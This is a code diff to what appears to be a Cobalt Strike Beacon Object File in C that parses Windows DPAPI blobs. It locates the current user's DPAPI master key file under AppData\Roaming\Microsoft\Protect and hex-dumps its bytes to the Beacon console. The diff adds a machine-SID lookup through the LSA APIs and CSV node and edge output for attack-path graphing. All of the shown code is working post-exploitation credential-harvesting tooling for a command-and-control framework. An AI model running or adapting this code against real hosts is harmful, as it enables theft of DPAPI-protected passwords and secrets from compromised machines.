@@ -1,5 +1,6 @@
 #include <windows.h>
 #include <sddl.h>
+#include <ntsecapi.h>
 #include "beacon.h"
 #include "utils.h"
 
@@ -7,6 +8,34 @@
 formatp outputbuffer;
 BOOL g_DUMP_RAW = FALSE;
 BOOL g_OUTPUT_CSV = FALSE;
+
+// Helper to get the Machine SID
+char* getMachineSid() {
+    LSA_HANDLE hPolicy;
+    LSA_OBJECT_ATTRIBUTES objAttr;
+    memset(&objAttr, 0, sizeof(objAttr));
+    NTSTATUS status;
+    char* szMachineSid = NULL;
+
+    // Use ADVAPI32 for LSA calls
+    status = ADVAPI32$LsaOpenPolicy(NULL, &objAttr, POLICY_VIEW_LOCAL_INFORMATION, &hPolicy);
+    if (status == 0) { // STATUS_SUCCESS
+        PPOLICY_ACCOUNT_DOMAIN_INFO pInfo = NULL;
+        status = ADVAPI32$LsaQueryInformationPolicy(hPolicy, PolicyAccountDomainInformation, (PVOID*)&pInfo);
+        if (status == 0 && pInfo->DomainSid) {
+            char* tempSid = NULL;
+            if (ADVAPI32$ConvertSidToStringSidA(pInfo->DomainSid, &tempSid)) {
+                size_t sidLen = MSVCRT$strlen(tempSid);
+                szMachineSid = (char*)malloc(sidLen + 1);
+                if (szMachineSid) MSVCRT$memcpy(szMachineSid, tempSid, sidLen + 1);
+                KERNEL32$LocalFree(tempSid);
+            }
+        }
+        if (pInfo) ADVAPI32$LsaFreeMemory(pInfo);
+        ADVAPI32$LsaClose(hPolicy);
+    }
+    return szMachineSid;
+}
 
 // Helper to read a file and append its hex representation to the output buffer
 void dumpFileBytes(char* filePath) {
@@ -39,6 +68,7 @@ void parseFile(char* filePath) {
     DWORD bytesRead;
     
     char *szSid = NULL;
+    char *szMachineSid = NULL;
     wchar_t* szLocalDesc = NULL;
     char mkPath[MAX_PATH] = {0};
     char guidStr[37] = {0};
@@ -97,7 +127,10 @@ void parseFile(char* filePath) {
             (unsigned char)g4[0], (unsigned char)g4[1], (unsigned char)g5[0], (unsigned char)g5[1],
             (unsigned char)g5[2], (unsigned char)g5[3], (unsigned char)g5[4], (unsigned char)g5[5]);
 
-        // 3. Get current user SID to build the path to the expected Master Key file
+        // 3. Get Identifiers (User SID and Machine SID) to build the path to the expected Master Key file        
+        szMachineSid = getMachineSid();
+        if (szMachineSid) BeaconFormatPrintf(&outputbuffer, "[*] Machine SID: %s\n", szMachineSid);
+
         HANDLE hToken;
         if (ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
             DWORD len = 0;
@@ -115,11 +148,11 @@ void parseFile(char* filePath) {
                     if (KERNEL32$GetEnvironmentVariableA("USERPROFILE", szProfilePath, MAX_PATH) > 0) {
                         // Construct path to the Master Key file in AppData
                         snprintf(mkPath, MAX_PATH, "%s\\AppData\\Roaming\\Microsoft\\Protect\\%s\\%s", 
-                                 szProfilePath, szSid, guidStr);
+                                   szProfilePath, szSid, guidStr);
                         BeaconFormatPrintf(&outputbuffer, "[*] Master Key GUID: %s\n", guidStr);
                         dumpFileBytes(mkPath);
                     }
-                    KERNEL32$LocalFree(tempSid); // Free the one allocated by Windows
+                    KERNEL32$LocalFree(tempSid);    // Free the one allocated by Windows
                 }
             }
             if (pTUser) free(pTUser);
@@ -127,13 +160,22 @@ void parseFile(char* filePath) {
         }
 
         if(g_OUTPUT_CSV) {
+            // Find the last backslash to isolate the filename
+            char* blobFileName = strrchr(filePath, '\\');
+            if (blobFileName) {
+                blobFileName++; // Move past the backslash
+            } else {
+                blobFileName = filePath; // No backslash found, use full path as filename
+            }            
             // --- CSV OUTPUT START ---    
             // Nodes
+            if (szMachineSid) BeaconFormatPrintf(&outputbuffer, "node,Machine,%s,%s\n", szMachineSid, szMachineSid);
             BeaconFormatPrintf(&outputbuffer, "node,User,%s,%s\n", szSid, szSid);
             BeaconFormatPrintf(&outputbuffer, "node,DPAPIMasterKey,%s,%s\n", guidStr, guidStr);
-            BeaconFormatPrintf(&outputbuffer, "node,DPAPIBlob,%s,%s,%ls\n", filePath, filePath, szLocalDesc ? szLocalDesc : L"None");
+            BeaconFormatPrintf(&outputbuffer, "node,DPAPIBlob,%s,%s,%ls\n", filePath, blobFileName, szLocalDesc ? szLocalDesc : L"None");
 
             // Edges
+            if (szMachineSid && szSid) BeaconFormatPrintf(&outputbuffer, "edge,HasProfile,%s,%s\n", szMachineSid, szSid);
             BeaconFormatPrintf(&outputbuffer, "edge,OwnsKey,%s,%s\n", szSid, guidStr);
             BeaconFormatPrintf(&outputbuffer, "edge,EncryptedWith,%s,%s\n", filePath, guidStr);
             // --- CSV OUTPUT END ---
@@ -143,6 +185,7 @@ void parseFile(char* filePath) {
         // --- CLEANUP ---
         if (szLocalDesc) free(szLocalDesc);
         if (szSid) free(szSid);
+        if (szMachineSid) free(szMachineSid);
     }
 }
 
@@ -197,10 +240,8 @@ void go(char* args, int len) {
     }
 
     BeaconFormatPrintf(&outputbuffer, "[+] BOF Finished.\n");
-
     // Flush the dynamic buffer to the Beacon console
     BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&outputbuffer, NULL));
-
     // Release the heap memory back to the system
     BeaconFormatFree(&outputbuffer);
 }
